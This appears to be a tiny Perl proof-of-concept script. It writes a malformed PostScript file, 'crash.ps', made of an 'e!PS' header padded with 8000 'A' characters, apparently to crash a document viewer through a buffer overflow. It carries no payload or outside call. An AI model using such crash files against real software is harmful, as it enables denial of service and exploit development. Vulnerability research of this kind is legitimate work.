$pkt = "e!PS".
"A" x 8000;

open(F,">crash.ps");

print F $pkt;

close(F);